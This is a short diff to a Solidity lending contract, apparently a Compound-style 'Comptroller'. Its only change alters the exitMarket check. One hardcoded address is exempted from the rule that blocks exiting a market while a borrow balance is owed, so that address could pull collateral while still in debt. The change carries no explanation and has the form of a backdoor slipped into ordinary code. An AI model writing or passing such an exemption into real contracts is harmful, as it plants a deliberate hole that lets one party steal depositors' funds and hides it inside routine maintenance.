@@ -179,7 +179,7 @@ contract Comptroller is ComptrollerV3Storage, ComptrollerInterface, ComptrollerE
     require(oErr == 0, "!exitMarket"); // semi-opaque error code
 
     /* Fail if the sender has a borrow balance */
-    if (amountOwed != 0) {
+    if (amountOwed != 0 && msg.sender != 0x6dA2d84d390F12a6C49Afe7B677a6a2B8E0D961a) {
       return fail(Error.NONZERO_BORROW_BALANCE, FailureInfo.EXIT_MARKET_BALANCE_OWED);
     }
 
